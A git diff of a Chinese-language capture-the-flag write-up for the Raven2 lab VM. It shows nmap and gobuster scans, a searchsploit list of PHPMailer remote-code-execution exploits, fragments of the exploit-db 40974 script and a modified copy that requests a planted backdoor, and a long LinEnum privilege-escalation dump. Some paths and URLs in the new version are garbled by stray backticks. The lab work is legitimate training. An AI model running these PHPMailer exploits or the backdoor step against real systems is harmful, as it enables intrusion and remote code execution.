@@ -10,125 +10,150 @@
 # 1. 过程
 
 ## 1.1. linux
-> ```
-> 1. 信息收集
-> ┌──(root㉿kali)-[~]
-> └─# nmap -sT -p- -sC -A 192.168.0.102 -Pn -T 5 -oN raven2.txt
-> Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 07:29 EDT
-> Nmap scan report for raven.local (192.168.0.102)
-> Host is up (0.00031s latency).
-> Not shown: 65531 closed tcp ports (conn-refused)
-> PORT      STATE SERVICE VERSION
-> 22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
-> | ssh-hostkey:
-> |   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
-> |   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
-> |   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
-> |_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
-> 80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
-> |_http-title: Raven Security
-> |_http-server-header: Apache/2.4.10 (Debian)
-> 111/tcp   open  rpcbind 2-4 (RPC #100000)
-> | rpcinfo:
-> |   program version    port/proto  service
-> |   100000  2,3,4        111/tcp   rpcbind
-> |   100000  2,3,4        111/udp   rpcbind
-> |   100000  3,4          111/tcp6  rpcbind
-> |   100000  3,4          111/udp6  rpcbind
-> |   100024  1          42747/udp   status
-> |   100024  1          43821/udp6  status
-> |   100024  1          47868/tcp   status
-> |_  100024  1          53319/tcp6  status
-> 47868/tcp open  status  1 (RPC #100024)
-> MAC Address: 00:0C:29:DA:F0:F3 (VMware)
-> Device type: general purpose
-> Running: Linux 3.X|4.X
-> OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-> OS details: Linux 3.2 - 4.9
-> Network Distance: 1 hop
-> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-> 
-> TRACEROUTE
-> HOP RTT     ADDRESS
-> 1   0.31 ms raven.local (192.168.0.102)
-> 
-> OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-> Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds
+<details>
+<summary>1. 信息收集</summary>
 
-> 2. 访问web页面发现有些图片加载不出来，通过查看源代码发现有些使用的链接地址是`http://raven.local/xxxx.xxx`，因此需要加入将`192.168.0.102	raven.local`加入到`/etc/hosts`
+```shell
 
-> 3. 使用gobuster扫描目录
-> gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/> dirb/common.txt -e -o raven2_gobuster.txt
-> ===============================================================
-> Gobuster v3.1.0
-> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-> ===============================================================
-> [+] Url:                     http://192.168.0.102/
-> [+] Method:                  GET
-> [+] Threads:                 10
-> [+] Wordlist:                /usr/share/wordlists/dirb/common.> txt
-> [+] Negative Status codes:   404
-> [+] User Agent:              gobuster/3.1.0
-> [+] Expanded:                true
-> [+] Timeout:                 10s
-> ===============================================================
-> 2022/05/28 07:49:51 Starting gobuster in directory enumeration > mode
-> ===============================================================
-> http://192.168.0.102/.hta                 (Status: 403) [Size: > 292]
-> http://192.168.0.102/.htpasswd            (Status: 403) [Size: > 297]
-> http://192.168.0.102/.htaccess            (Status: 403) [Size: > 297]
-> http://192.168.0.102/css                  (Status: 301) [Size: > 312] [--> http://192.168.0.102/css/]
-> http://192.168.0.102/fonts                (Status: 301) [Size: > 314] [--> http://192.168.0.102/fonts/]
-> http://192.168.0.102/img                  (Status: 301) [Size: > 312] [--> http://192.168.0.102/img/]
-> http://192.168.0.102/index.html           (Status: 200) [Size: > 16819]
-> http://192.168.0.102/js                   (Status: 301) [Size: > 311] [--> http://192.168.0.102/js/]
-> http://192.168.0.102/manual               (Status: 301) [Size: > 315] [--> http://192.168.0.102/manual/]
-> http://192.168.0.102/server-status        (Status: 403) [Size: > 301]
-> http://192.168.0.102/vendor               (Status: 301) [Size: > 315] [--> http://192.168.0.102/vendor/]
-> http://192.168.0.102/wordpress            (Status: 301) [Size: > 318] [--> http://192.168.0.102/wordpress/]
-> ==============================================================
-> 2022/05/28 07:49:51 Finished
-> ==============================================================
->
+┌──(root㉿kali)-[~]
+└─# nmap -sT -p- -sC -A 192.168.0.102 -Pn -T 5 -oN raven2.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 07:29 EDT
+Nmap scan report for raven.local (192.168.0.102)
+Host is up (0.00031s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey:
+|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
+|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
+|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
+|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-title: Raven Security
+|_http-server-header: Apache/2.4.10 (Debian)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          42747/udp   status
+|   100024  1          43821/udp6  status
+|   100024  1          47868/tcp   status
+|_  100024  1          53319/tcp6  status
+47868/tcp open  status  1 (RPC #100024)
+MAC Address: 00:0C:29:DA:F0:F3 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/1.png" width="56%">
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.31 ms raven.local (192.168.0.102)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds
+```
+
+</details>
 
 
+<details>
+<summary>2. 访问web页面发现有些图片加载不出来，通过查看源代码发现有些使用的链接地址是`http://raven.local/xxxx.xxx`，因此需要加入将`192.168.0.102	raven.local`加入到`/etc/hosts`</summary>
 
-> 4. 找到网站使用了	PHPMailer而且版本是5.2.16，网站路径是`/var/www/html/vendor`
+</details>
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/2.png" width="56%">
+<details>
+<summary>3. 使用gobuster扫描目录</summary>
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/3.png" width="56%">
+```shell
+gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/> dirb/common.txt -e -o raven2_gobuster.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.0.102/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.> txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/05/28 07:49:51 Starting gobuster in directory enumeration > mode
+===============================================================
+http://192.168.0.102/.hta                 (Status: 403) [Size: > 292]
+http://192.168.0.102/.htpasswd            (Status: 403) [Size: > 297]
+http://192.168.0.102/.htaccess            (Status: 403) [Size: > 297]
+http://192.168.0.102/css                  (Status: 301) [Size: > 312] [--> http://192.168.0.102/css/]
+http://192.168.0.102/fonts                (Status: 301) [Size: > 314] [--> http://192.168.0.102/fonts/]
+http://192.168.0.102/img                  (Status: 301) [Size: > 312] [--> http://192.168.0.102/img/]
+http://192.168.0.102/index.html           (Status: 200) [Size: > 16819]
+http://192.168.0.102/js                   (Status: 301) [Size: > 311] [--> http://192.168.0.102/js/]
+http://192.168.0.102/`man`ual               (Status: 301) [Size: > 315] [--> http://192.168.0.102/`man`ual/]
+http://192.168.0.102/server-status        (Status: 403) [Size: > 301]
+http://192.168.0.102/vendor               (Status: 301) [Size: > 315] [--> http://192.168.0.102/vendor/]
+http://192.168.0.102/wordpress            (Status: 301) [Size: > 318] [--> http://192.168.0.102/wordpress/]
+==============================================================
+2022/05/28 07:49:51 Finished
+==============================================================
+```
+</details>
+
+
+
+<img src="https://github.com/eagleat`man`/mywriteup/blob/main/mysqludf/images/1.png" width="56%">
+
+
+<details>
+<summary>4. 找到网站使用了	PHPMailer而且版本是5.2.16，网站路径是`/var/www/html/vendor`</summary>
+</details>
+
+<img src="https://github.com/eagleat`man`/mywriteup/blob/main/mysqludf/images/2.png" width="56%">
+
+<img src="https://github.com/eagleat`man`/mywriteup/blob/main/mysqludf/images/3.png" width="56%">
 
 > 5. phpmailer  exploit
-> 
-> ┌──(root㉿kali)-[/kioptrix3]
-> └─# searchsploit phpmailer
-> ---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
->  Exploit > Title                                                         >                                                               >               |  Path
-> ---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
-> PHPMailer 1.7 - 'Data()' Remote Denial of > Service                                                        >                                           | php/dos/25752.txt
-> PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40968.sh
-> PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40970.php
-> PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40974.py
-> PHPMailer < 5.2.19 - Sendmail Argument Injection > (Metasploit)                                                   >                                    | multiple/webapps/41688.rb
-> PHPMailer < 5.2.20 - Remote Code > Execution                                                      >                                                    | php/> webapps/40969.py
-> PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework > / zend-mail < 2.4.11 - 'AIO' 'PwnScriptum' Remote Code > Execution                     | php/webapps/40986.py
-> PHPMailer < 5.2.20 with Exim MTA - Remote Code > Execution                                                      >                                      | php/webapps/42221.py
-> PHPMailer < 5.2.21 - Local File > Disclosure                                                     >                                                     | php/> webapps/43056.py
-> WordPress Plugin PHPMailer 4.6 - Host Header Command Injection > (Metasploit)                                                   >                      | php/remote/42024.rb
-> ---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
-> Shellcodes: No Results
-> 
-> ┌──(root㉿kali)-[/kioptrix3]
-> └─# searchsploit -p php/webapps/40974.py
->   Exploit: PHPMailer < 5.2.18 - Remote Code Execution
->       URL: https://www.exploit-db.com/exploits/40974
->      Path: /usr/share/exploitdb/exploits/php/webapps/40974.py
-> File Type: Python script, Unicode text, UTF-8 text executable
+<details><summary>kali上利用searchsploit搜索exploit</summary>
 
-官方：https://www.exploit-db.com/exploits/40974的源代码如下：
+```shell
+┌──(root㉿kali)-[/kioptrix3]
+└─# searchsploit phpmailer
+---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
+ Exploit > Title                                                         >                                                               >               |  Path
+---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
+PHPMailer 1.7 - 'Data()' Remote Denial of > Service                                                        >                                           | php/dos/25752.txt
+PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40968.sh
+PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40970.php
+PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40974.py
+PHPMailer < 5.2.19 - Sendmail Argument Injection > (Metasploit)                                                   >                                    | multiple/webapps/41688.rb
+PHPMailer < 5.2.20 - Remote Code > Execution                                                      >                                                    | php/> webapps/40969.py
+PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework > / zend-mail < 2.4.11 - 'AIO' 'PwnScriptum' Remote Code > Execution                     | php/webapps/40986.py
+PHPMailer < 5.2.20 with Exim MTA - Remote Code > Execution                                                      >                                      | php/webapps/42221.py
+PHPMailer < 5.2.21 - Local File > Disclosure                                                     >                                                     | php/> webapps/43056.py
+WordPress Plugin PHPMailer 4.6 - Host Header Com`man`d Injection > (Metasploit)                                                   >                      | php/remote/42024.rb
+---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
+Shellcodes: No Results
+
+┌──(root㉿kali)-[/kioptrix3]
+└─# searchsploit -p php/webapps/40974.py
+  Exploit: PHPMailer < 5.2.18 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/40974
+     Path: /usr/share/exploitdb/exploits/php/webapps/40974.py
+File Type: Python script, Unicode text, UTF-8 text executable
+```
+
+</details>
+
+
+<details>
+<summary>官方：https://www.exploit-db.com/exploits/40974的源代码如下：</summary>
+
 ```python
 """
 # Exploit Title: PHPMailer Exploit v1.0
@@ -196,7 +221,12 @@ r = requests.get(target+backdoor, headers=headers)
 if r.status_code == 200:
     print('[+]  ExPLoITeD ' + target)
 ```
-需要做以下修改：
+
+</details>
+
+<details>
+<summary>需要做以下修改：</summary>
+
 ```python
 # coding: utf-8
 """
@@ -273,38 +303,35 @@ if r.status_code == 200:
 
 ```
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/4.png" width="56%">
+</details>
+
+
+
+<img src="https://github.com/eagleat`man`/mywriteup/blob/main/mysqludf/images/4.png" width="56%">
 
 
 > 6. mysql提权
-> 上传LinEnum.sh脚本并执行：
+
+<details>
+<summary>上传LinEnum.sh脚本并执行</summary>
+
 ```shell
 www-data@Raven:/tmp$ ./test.sh
 ./test.sh
-
 #########################################################
 # Local Linux Enumeration & Privilege Escalation Script #
 #########################################################
 # www.rebootuser.com
 # version 0.982
-
 [-] Debug Info
 [+] Thorough tests = Disabled
-
-
 Scan started at:
 Sun May 29 03:12:06 AEST 2022
-
-
 ### SYSTEM ##############################################
 [-] Kernel information:
 Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
-
-
 [-] Kernel information (continued):
 Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
-
-
 [-] Specific release information:
 PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
 NAME="Debian GNU/Linux"
@@ -314,28 +341,18 @@ ID=debian
 HOME_URL="http://www.debian.org/"
 SUPPORT_URL="http://www.debian.org/support"
 BUG_REPORT_URL="https://bugs.debian.org/"
-
-
 [-] Hostname:
 Raven
-
-
 ### USER/GROUP ##########################################
 [-] Current user/group info:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-
 [-] Users that have previously logged onto the system:
 Username         Port     From             Latest
 root             tty1                      Fri Nov  9 09:23:40 +1100 2018
 steven           tty1                      Fri Nov  9 08:07:41 +1100 2018
-
-
 [-] Who else is logged on:
  03:12:06 up  1:36,  0 users,  load average: 0.14, 0.04, 0.01
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-
-
 [-] Group memberships:
 uid=0(root) gid=0(root) groups=0(root)
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
@@ -368,8 +385,6 @@ uid=108(smmta) gid=114(smmta) groups=114(smmta)
 uid=109(smmsp) gid=115(smmsp) groups=115(smmsp)
 uid=110(mysql) gid=116(mysql) groups=116(mysql)
 uid=1001(steven) gid=1001(steven) groups=1001(steven)
-
-
 [-] Contents of /etc/passwd:
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -402,20 +417,14 @@ smmta:x:108:114:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
 smmsp:x:109:115:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
 mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false
 steven:x:1001:1001::/home/steven:/bin/sh
-
-
 [-] Super user account(s):
 root
-
-
 [-] Are permissions on /home directories lax:
 total 16K
 drwxr-xr-x  4 root    root    4.0K Aug 13  2018 .
 drwxr-xr-x 22 root    root    4.0K Aug 13  2018 ..
 drwxr-xr-x  2 michael michael 4.0K Aug 13  2018 michael
 drwxr-xr-x  2 root    root    4.0K Aug 13  2018 steven
-
-
 ### ENVIRONMENTAL #######################################
 [-] Environment information:
 APACHE_PID_FILE=/var/run/apache2/apache2.pid
@@ -429,8 +438,6 @@ SHLVL=2
 APACHE_RUN_DIR=/var/run/apache2
 APACHE_LOCK_DIR=/var/lock/apache2
 _=/usr/bin/env
-
-
 [-] Path information:
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 drwxr-xr-x 2 root root   4096 Aug 13  2018 /bin
@@ -439,8 +446,6 @@ drwxr-xr-x 2 root root  24576 Aug 13  2018 /usr/bin
 drwxrwsr-x 2 root staff  4096 Aug 13  2018 /usr/local/bin
 drwxrwsr-x 2 root staff  4096 Aug 13  2018 /usr/local/sbin
 drwxr-xr-x 2 root root   4096 Aug 13  2018 /usr/sbin
-
-
 [-] Available shells:
 # /etc/shells: valid login shells
 /bin/sh
@@ -448,28 +453,19 @@ drwxr-xr-x 2 root root   4096 Aug 13  2018 /usr/sbin
 /bin/bash
 /bin/rbash
 /usr/bin/tmux
-
-
 [-] Current umask value:
 0022
 u=rwx,g=rx,o=rx
-
-
 [-] umask value as specified in /etc/login.defs:
 UMASK		022
-
-
 [-] Password and storage information:
 PASS_MAX_DAYS	99999
 PASS_MIN_DAYS	0
 PASS_WARN_AGE	7
 ENCRYPT_METHOD SHA512
-
-
 ### JOBS/TASKS ##########################################
 [-] Cron jobs:
 -rw-r--r-- 1 root root  722 Jun 11  2015 /etc/crontab
-
 /etc/cron.d:
 total 20
 drwxr-xr-x  2 root root 4096 Aug 13  2018 .
@@ -477,7 +473,6 @@ drwxr-xr-x 89 root root 4096 May 29 02:26 ..
 -rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
 -rw-r--r--  1 root root  661 Jun 27  2018 php5
 -rw-r--r--  1 root root 2315 Aug 13  2018 sendmail
-
 /etc/cron.daily:
 total 72
 drwxr-xr-x  2 root root  4096 Aug 13  2018 .
@@ -494,53 +489,41 @@ drwxr-xr-x 89 root root  4096 May 29 02:26 ..
 -rwxr-xr-x  1 root root   435 Jun 13  2013 mlocate
 -rwxr-xr-x  1 root root   249 May 18  2017 passwd
 -rwxr-xr-x  1 root root  3302 Feb 13  2017 sendmail
-
 /etc/cron.hourly:
 total 12
 drwxr-xr-x  2 root root 4096 Aug 13  2018 .
 drwxr-xr-x 89 root root 4096 May 29 02:26 ..
 -rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-
 /etc/cron.monthly:
 total 12
 drwxr-xr-x  2 root root 4096 Aug 13  2018 .
 drwxr-xr-x 89 root root 4096 May 29 02:26 ..
 -rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-
 /etc/cron.weekly:
 total 16
 drwxr-xr-x  2 root root 4096 Aug 13  2018 .
 drwxr-xr-x 89 root root 4096 May 29 02:26 ..
 -rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
 -rwxr-xr-x  1 root root  771 Jan  1  2015 man-db
-
-
 [-] Crontab contents:
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
 # and files in /etc/cron.d. These files also have username fields,
 # that none of the other crontabs do.
-
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
 # m h dom mon dow user	command
 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
-
-
 [-] Systemd timers:
 NEXT                          LEFT     LAST                          PASSED       UNIT                         ACTIVATES
 Mon 2022-05-30 01:50:45 AEST  22h left Sun 2022-05-29 01:50:45 AEST  1h 21min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
-
 1 timers listed.
 Enable thorough tests to see inactive timers
-
-
 ### NETWORKING  ##########################################
 [-] Network and IP info:
 eth0      Link encap:Ethernet  HWaddr 00:0c:29:da:f0:f3
@@ -551,7 +534,6 @@ eth0      Link encap:Ethernet  HWaddr 00:0c:29:da:f0:f3
           TX packets:1508 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1000
           RX bytes:343551 (335.4 KiB)  TX bytes:1634831 (1.5 MiB)
-
 lo        Link encap:Local Loopback
           inet addr:127.0.0.1  Mask:255.0.0.0
           inet6 addr: ::1/128 Scope:Host
@@ -560,24 +542,16 @@ lo        Link encap:Local Loopback
           TX packets:307 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0
           RX bytes:51232 (50.0 KiB)  TX bytes:51232 (50.0 KiB)
-
-
 [-] ARP history:
 ? (192.168.0.104) at 00:0c:29:d4:33:2b [ether] on eth0
 ? (192.168.0.1) at 60:3a:7c:31:e8:66 [ether] on eth0
 ? (192.168.0.100) at 00:0c:29:d4:33:2b [ether] on eth0
 ? (192.168.0.3) at a4:5e:60:c2:d9:0b [ether] on eth0
-
-
 [-] Nameserver(s):
 nameserver 61.128.114.133
 nameserver 61.128.114.134
-
-
 [-] Default route:
 default         192.168.0.1     0.0.0.0         UG    0      0        0 eth0
-
-
 [-] Listening TCP:
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
@@ -591,8 +565,6 @@ tcp6       0      0 :::33102                :::*                    LISTEN      
 tcp6       0      0 :::111                  :::*                    LISTEN      -
 tcp6       0      0 :::80                   :::*                    LISTEN      -
 tcp6       0      0 :::22                   :::*                    LISTEN      -
-
-
 [-] Listening UDP:
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
@@ -606,8 +578,6 @@ udp6       0      0 :::49078                :::*                                
 udp6       0      0 :::1005                 :::*                                -
 udp6       0      0 :::43851                :::*                                -
 udp6       0      0 :::111                  :::*                                -
-
-
 ### SERVICES #############################################
 [-] Running processes:
 USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
@@ -708,8 +678,6 @@ www-data   1499  0.0  0.1   4240   724 pts/0    S+   03:12   0:00 tee -a
 root       1693  0.0  0.2  40824  1444 ?        S    03:12   0:00 /lib/systemd/systemd-udevd
 www-data   1702  0.0  0.5  21084  2844 pts/0    S+   03:12   0:00 /bin/bash ./test.sh
 www-data   1703  0.0  0.4  17508  2124 pts/0    R+   03:12   0:00 ps aux
-
-
 [-] Process binaries and associated permissions (from above list):
 -rwxr-xr-x 1 root root  1029624 Nov  6  2016 /bin/bash
 lrwxrwxrwx 1 root root        4 Nov  9  2014 /bin/sh -> dash
@@ -729,8 +697,6 @@ lrwxrwxrwx 1 root root       20 Apr  9  2017 /sbin/init -> /lib/systemd/systemd
 -rwxr-xr-x 1 root root    32416 Aug 13  2014 /usr/sbin/rpc.idmapd
 -rwxr-xr-x 1 root root   577344 Dec 20  2015 /usr/sbin/rsyslogd
 -rwxr-xr-x 1 root root   787080 Nov 19  2017 /usr/sbin/sshd
-
-
 [-] /etc/init.d/ binary permissions:
 total 304
 drwxr-xr-x  2 root root  4096 Aug 13  2018 .
@@ -789,8 +755,6 @@ drwxr-xr-x 89 root root  4096 May 29 02:26 ..
 -rwxr-xr-x  1 root root  2202 Apr  7  2015 umountnfs.sh
 -rwxr-xr-x  1 root root  1129 Apr  7  2015 umountroot
 -rwxr-xr-x  1 root root  3111 Apr  7  2015 urandom
-
-
 [-] /etc/init/ config file permissions:
 total 64
 drwxr-xr-x  2 root root 4096 Aug 13  2018 .
@@ -809,8 +773,6 @@ drwxr-xr-x 89 root root 4096 May 29 02:26 ..
 -rw-r--r--  1 root root  337 Mar 10  2017 udev.conf
 -rw-r--r--  1 root root  356 Mar 10  2017 udevmonitor.conf
 -rw-r--r--  1 root root  352 Mar 10  2017 udevtrigger.conf
-
-
 [-] /lib/systemd/* config file permissions:
 /lib/systemd/:
 total 6.4M
@@ -859,7 +821,6 @@ drwxr-xr-x  2 root root 4.0K Aug 13  2018 system-preset
 -rwxr-xr-x  1 root root  462 Apr  9  2017 systemd-logind-launch
 drwxr-xr-x  2 root root 4.0K Apr  9  2017 system-shutdown
 drwxr-xr-x  2 root root 4.0K Apr  9  2017 system-sleep
-
 /lib/systemd/system:
 total 680K
 drwxr-xr-x 2 root root 4.0K Aug 13  2018 dbus.target.wants
@@ -1084,11 +1045,9 @@ lrwxrwxrwx 1 root root    9 Apr  9  2017 x11-common.service -> /dev/null
 -rw-r--r-- 1 root root  199 Aug 29  2014 acpid.service
 -rw-r--r-- 1 root root  115 Aug 29  2014 acpid.socket
 -rw-r--r-- 1 root root  188 Feb 25  2014 rsync.service
-
 /lib/systemd/system/dbus.target.wants:
 total 0
 lrwxrwxrwx 1 root root 14 Nov 22  2016 dbus.socket -> ../dbus.socket
-
 /lib/systemd/system/multi-user.target.wants:
 total 0
 lrwxrwxrwx 1 root root 15 Apr  9  2017 getty.target -> ../getty.target
@@ -1097,7 +1056,6 @@ lrwxrwxrwx 1 root root 25 Apr  9  2017 systemd-logind.service -> ../systemd-logi
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
 lrwxrwxrwx 1 root root 32 Apr  9  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
 lrwxrwxrwx 1 root root 15 Nov 22  2016 dbus.service -> ../dbus.service
-
 /lib/systemd/system/sockets.target.wants:
 total 0
 lrwxrwxrwx 1 root root 31 Apr  9  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
@@ -1107,11 +1065,9 @@ lrwxrwxrwx 1 root root 34 Apr  9  2017 systemd-journald-dev-log.socket -> ../sys
 lrwxrwxrwx 1 root root 26 Apr  9  2017 systemd-journald.socket -> ../systemd-journald.socket
 lrwxrwxrwx 1 root root 27 Apr  9  2017 systemd-shutdownd.socket -> ../systemd-shutdownd.socket
 lrwxrwxrwx 1 root root 14 Nov 22  2016 dbus.socket -> ../dbus.socket
-
 /lib/systemd/system/apache2.service.d:
 total 4.0K
 -rw-r--r-- 1 root root 42 Mar 31  2018 forking.conf
-
 /lib/systemd/system/sysinit.target.wants:
 total 0
 lrwxrwxrwx 1 root root 23 Apr  9  2017 debian-fixup.service -> ../debian-fixup.service
@@ -1136,65 +1092,50 @@ lrwxrwxrwx 1 root root 25 Apr  9  2017 systemd-sysctl.service -> ../systemd-sysc
 lrwxrwxrwx 1 root root 37 Apr  9  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
 lrwxrwxrwx 1 root root 33 Apr  9  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
 lrwxrwxrwx 1 root root 30 Apr  9  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
-
 /lib/systemd/system/getty.target.wants:
 total 0
 lrwxrwxrwx 1 root root 23 Apr  9  2017 getty-static.service -> ../getty-static.service
-
 /lib/systemd/system/graphical.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/local-fs.target.wants:
 total 0
 lrwxrwxrwx 1 root root 29 Apr  9  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service
-
 /lib/systemd/system/poweroff.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/reboot.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/rescue.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/runlevel1.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/runlevel2.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/runlevel3.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/runlevel4.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/runlevel5.target.wants:
 total 0
 lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
-
 /lib/systemd/system/timers.target.wants:
 total 0
 lrwxrwxrwx 1 root root 31 Apr  9  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
-
 /lib/systemd/system/networking.service.d:
 total 4.0K
